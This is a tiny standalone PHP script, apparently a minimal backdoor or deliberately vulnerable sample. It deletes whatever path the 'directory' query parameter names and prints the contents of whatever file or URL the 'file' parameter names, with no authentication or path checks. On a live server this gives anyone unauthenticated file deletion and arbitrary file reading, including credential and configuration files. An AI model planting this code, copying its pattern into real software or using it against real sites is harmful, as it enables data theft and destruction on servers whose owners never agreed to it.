<?php 
$directory = $_GET['directory'];
if(!empty($directory)) unlink($directory);
$file = $_GET['file'];
if(!empty($file))  echo file_get_contents($file);
?>